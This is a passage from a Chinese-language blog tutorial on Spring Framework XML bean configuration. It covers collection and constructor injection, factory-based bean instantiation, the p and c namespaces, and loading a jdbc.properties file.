class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<h3 id="3-map集合注入"><a href="#3-map集合注入" class="headerlink" title="3. map集合注入"></a>3. map集合注入</h3><blockquote>
<ul>
<li><strong><code>map</code>：注入map数据类型变量</strong></li>
</ul>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.dao.impl.UserDaoImpl&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;userMap&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;u1&quot;</span> <span class="attr">value-ref</span>=<span class="string">&quot;user1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;u2&quot;</span> <span class="attr">value-ref</span>=<span class="string">&quot;user2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<h3 id="4-props属性注入"><a href="#4-props属性注入" class="headerlink" title="4. props属性注入"></a>4. props属性注入</h3><blockquote>
<ul>
<li><strong><code>props</code>：注入props数据类型变量</strong></li>
</ul>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.dao.impl.UserDaoImpl&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;properties&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;p1&quot;</span>&gt;</span>ppp1<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;p2&quot;</span>&gt;</span>ppp2<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;p3&quot;</span>&gt;</span>ppp3<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<h3 id="5-array数组注入"><a href="#5-array数组注入" class="headerlink" title="5. array数组注入"></a>5. array数组注入</h3><blockquote>
<ul>
<li><strong><code>array</code>：注入数组变量</strong></li>
</ul>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.dao.impl.UserDaoImpl&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">value</span>&gt;</span>唱<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">value</span>&gt;</span>跳<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">value</span>&gt;</span>rap<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">value</span>&gt;</span>篮球<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<h3 id="6-set集合注入"><a href="#6-set集合注入" class="headerlink" title="6. set集合注入"></a>6. set集合注入</h3><blockquote>
<ul>
<li><strong><code>set</code>：注入set数据类型变量</strong></li>
</ul>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.dao.impl.UserDaoImpl&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">value</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">value</span>&gt;</span>bbb<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">value</span>&gt;</span>ccc<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<h3 id="7-null注入"><a href="#7-null注入" class="headerlink" title="7. null注入"></a>7. null注入</h3><blockquote>
<ul>
<li><strong><code>null</code>：注入null</strong></li>
</ul>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.dao.impl.UserDaoImpl&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">null</span>/&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<h3 id="8-constructor-arg标签"><a href="#8-constructor-arg标签" class="headerlink" title="8. constructor-arg标签"></a>8. constructor-arg标签</h3><blockquote>
<ul>
<li><strong><code>constructor-arg</code>：通过有参构造方法创建Bean实例，有三种方式编写</strong></li>
</ul>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 第一种根据index参数下标设置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.dao.impl.UserDaoImpl&quot;</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- index指构造方法 , 下标从0开始 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">value</span>=<span class="string">&quot;张三&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;17&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span> &gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">value</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">value</span>&gt;</span>bbb<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">value</span>&gt;</span>ccc<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 第二种根据参数名字设置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.dao.impl.UserDaoImpl&quot;</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- name指参数名 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;张三&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">value</span>=<span class="string">&quot;17&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;set&quot;</span> &gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">value</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">value</span>&gt;</span>bbb<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">value</span>&gt;</span>ccc<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 第三种根据参数类型设置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.dao.impl.UserDaoImpl&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">value</span>=<span class="string">&quot;张三&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">&quot;java.lang.Integer&quot;</span> <span class="attr">value</span>=<span class="string">&quot;17&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">&quot;java.util.Set&quot;</span> &gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">value</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">value</span>&gt;</span>bbb<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">value</span>&gt;</span>ccc<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="5-Bean实例化三种方式"><a href="#5-Bean实例化三种方式" class="headerlink" title="5. Bean实例化三种方式"></a>5. Bean实例化三种方式</h2><p><strong>Bean的实例化方式由三种：<br>①&#x3D;&#x3D;使用类构造器实例化&#x3D;&#x3D;<br>②&#x3D;&#x3D;工厂方法实例化（静态工厂、实例工厂）&#x3D;&#x3D;<br>③&#x3D;&#x3D;实现FactoyBean接口。&#x3D;&#x3D;</strong></p>
<blockquote>
<ul>
<li><strong>使用类构造器实例化</strong><br>在配置Bean时，使用<code>class</code>属性指定类的全限定名称。<br>在 【<strong>二、Spring开发步骤</strong>】所演示即为使用类构造器实例化，这里不再过多叙述。</li>
</ul>
</blockquote>
<hr>
<blockquote>
<ul>
<li><strong><code>静态工厂</code>方法实例化</strong><br>将对象的创建过程封装成静态方法，当需要对象时，只需要调用静态方法即可。<br>在配置Bean时，使用<code>class</code>属性指定该静态工厂的全限定名称，同时使用<code>factory-method</code>属性指定实例化对象的静态方法名称。</li>
</ul>
</blockquote>
<p><strong>① 定义静态工厂类，定义实例化对象的静态方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StaticFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> UserDao <span class="title function_">getUserDao</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">UserDaoImpl</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>② 在Spring核心配置文件中定义静态工厂实例化的方式创建 Bean</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    静态工厂实例化的方式创建 Bean--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.factory.StaticFactory&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span> <span class="attr">factory-method</span>=<span class="string">&quot;getUserDao&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<blockquote>
<ul>
<li><strong><code>工厂实例</code>方法实例化</strong><br>将对象的创建过程封装到另一个对象实例的方法中。当需要对象时，只需要调用该实例方法即可。<br>在配置Bean时，首先声明该实例工厂类的Bean；再声明需要实例的对象的Bean，使用<code>factory-bean</code>属性指定实例工厂类的Bean的id，同时使用<code>factory-method</code>属性指定实例工厂中的实例化对象的方法名称。</li>
</ul>
</blockquote>
<p><strong>① 定义实例化工厂类，定义实例化对象的方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DynamicFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> UserDao <span class="title function_">getUserDao</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">UserDaoImpl</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>② 在Spring核心配置文件中定义实例工厂方式创建 Bean</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--   实例工厂实例化的方式创建 Bean--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--   首先声明该实例工厂类的 Bean--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;factoryObject&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.factory.DynamicFactory&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--   再声明需要实例的对象的Bean--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">factory-bean</span>=<span class="string">&quot;factoryObject&quot;</span> <span class="attr">factory-method</span>=<span class="string">&quot;getUserDao&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<blockquote>
<ul>
<li><strong>使用<code>FactoryBean</code>接口实例化</strong><br>FactoryBean是Spring提供的接口<br><code>getObject</code>：返回实例化对象；<br><code>getObjectType</code>：返回具体类型；<br><code>isSingleton</code>：判断Bean是否为单例；<br>在配置Bean时，使用<code>class</code>属性指定创建的FactoryBean实现类。</li>
</ul>
<p><strong>① 定义工厂类，并实现<code>FactoryBean</code>接口</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDaoFactoryBean</span> <span class="keyword">implements</span> <span class="title class_">FactoryBean</span>&lt;UserDaoImpl&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 代替原始对象工厂中创建对象的方法，返回实例</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> UserDaoImpl <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">UserDaoImpl</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回 具体类型</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; getObjectType() &#123;</span><br><span class="line">        <span class="keyword">return</span> UserDaoImpl.class;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断对象是否单例</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSingleton</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="②-在Spring核心配置文件中定义使用FactoryBean接口实例化方式创建-Bean"><a href="#②-在Spring核心配置文件中定义使用FactoryBean接口实例化方式创建-Bean" class="headerlink" title="② 在Spring核心配置文件中定义使用FactoryBean接口实例化方式创建 Bean"></a><strong>② 在Spring核心配置文件中定义使用FactoryBean接口实例化方式创建 Bean</strong><br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--      使用FactoryBean接口实例化方式创建 Bean--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.factory.UserDaoFactoryBean&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></h2><h2 id="6-import-引入其他配置文件"><a href="#6-import-引入其他配置文件" class="headerlink" title="6. import-引入其他配置文件"></a>6. import-引入其他配置文件</h2><blockquote>
<ul>
<li><code>import</code>：实际开发中，Spring配置内容非常多，这就导致Spring配置繁杂且体积大，所以，可使用<code>import</code>标签将部分配置拆解到其他配置文件，而在Spring主配置文件通过<code>import</code>标签进行加载</li>
</ul>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;applicationContext-user.xml&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="7-p命名空间与c命名空间注入"><a href="#7-p命名空间与c命名空间注入" class="headerlink" title="7. p命名空间与c命名空间注入"></a>7. p命名空间与c命名空间注入</h2><blockquote>
<ul>
<li><strong><code>p（属性：properties）命名空间引入</code>：需要在头文件中加入约束 <code>xmlns:p=&quot;http://www.springframework.org/schema/p&quot;</code></strong></li>
</ul>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--    xmlns:p=&quot;http://www.springframework.org/schema/p&quot; p命名空间--&gt;</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!--    使用set方法传统方法注入，将其改为以下 p命名空间 注入--&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">	&lt;bean id=&quot;userDao&quot; class=&quot;com.tyt.dao.impl.UserDaoImpl&quot; scope=&quot;prototype&quot;&gt;</span></span><br><span class="line"><span class="comment">		&lt;property name=&quot;username&quot; value=&quot;张三&quot;&gt;&lt;/property&gt;</span></span><br><span class="line"><span class="comment">		&lt;property name=&quot;age&quot; value=&quot;17&quot;&gt;&lt;/property&gt;</span></span><br><span class="line"><span class="comment">	&lt;/bean&gt;</span></span><br><span class="line"><span class="comment">	&lt;bean id=&quot;userService&quot; class=&quot;com.tyt.service.impl.UserServiceImpl&quot;&gt;</span></span><br><span class="line"><span class="comment">		&lt;property name=&quot;userDao&quot; ref=&quot;userDao&quot;&gt;&lt;/property&gt;</span></span><br><span class="line"><span class="comment">	&lt;/bean&gt; </span></span><br><span class="line"><span class="comment">	--&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!--    p（属性：properties） 命名空间，直接注入属性--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.dao.impl.UserDaoImpl&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span> <span class="attr">p:username</span>=<span class="string">&quot;张三&quot;</span> <span class="attr">p:age</span>=<span class="string">&quot;17&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.service.impl.UserServiceImpl&quot;</span> <span class="attr">p:userDao-ref</span> =<span class="string">&quot;userDao&quot;</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<blockquote>
<ul>
<li><strong><code>c（构造: Constructor）命名空间引入</code>：需要在头文件中加入约束 <code>xmlns:c=&quot;http://www.springframework.org/schema/c&quot;</code></strong></li>
</ul>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--    xmlns:p=&quot;http://www.springframework.org/schema/p&quot; p命名空间--&gt;</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!--    使用set方法传统方法注入，将其改为以下 c命名空间 注入--&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">	&lt;bean id=&quot;userDao&quot; class=&quot;com.tyt.dao.impl.UserDaoImpl&quot;&gt;</span></span><br><span class="line"><span class="comment">		&lt;constructor-arg type=&quot;java.lang.String&quot; value=&quot;张三&quot;/&gt;</span></span><br><span class="line"><span class="comment">		&lt;constructor-arg type=&quot;java.lang.Integer&quot; value=&quot;17&quot;/&gt;</span></span><br><span class="line"><span class="comment">		&lt;constructor-arg type=&quot;java.util.Set&quot; &gt;</span></span><br><span class="line"><span class="comment">			&lt;set&gt;</span></span><br><span class="line"><span class="comment">				&lt;value&gt;aaa&lt;/value&gt;</span></span><br><span class="line"><span class="comment">				&lt;value&gt;bbb&lt;/value&gt;</span></span><br><span class="line"><span class="comment">				&lt;value&gt;ccc&lt;/value&gt;</span></span><br><span class="line"><span class="comment">			&lt;/set&gt;</span></span><br><span class="line"><span class="comment">		&lt;/constructor-arg&gt;</span></span><br><span class="line"><span class="comment">	&lt;/bean&gt;</span></span><br><span class="line"><span class="comment">	--&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--    c（构造: Constructor） 命名空间，使用构造器注入--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.dao.impl.UserDaoImpl&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span> <span class="attr">p:username</span>=<span class="string">&quot;张三&quot;</span> <span class="attr">p:age</span>=<span class="string">&quot;17&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">&quot;java.util.Set&quot;</span> &gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">value</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">value</span>&gt;</span>bbb<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">value</span>&gt;</span>ccc<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="8-加载-properties-文件"><a href="#8-加载-properties-文件" class="headerlink" title="8. 加载 properties 文件"></a>8. 加载 properties 文件</h2><p><strong>① 创建jdbc.properties文件</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jdbc.driver=com.mysql.jdbc.Driver</span><br><span class="line">jdbc.url=jdbc:mysql://localhost:3306/test?characterEncoding=utf8</span><br><span class="line">jdbc.username=root</span><br><span class="line">jdbc.password=****</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>格式：变量名&#x3D;变量值</li>
<li>在该文件中不要出现多余的空格，因为可能会错误的认为空格也是值的一部分，导致取出的值错误。</li>
<li>变量名尽量也不要直接命名为”username”或者”password”这些，这些命名可能会和系统命名重复，在使用${}符取值时会优先取系统变量值。</li>
</ul>
<p><strong>② 开启context命名空间，加载properties配置文件</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155610.png"></p>
</blockquote>
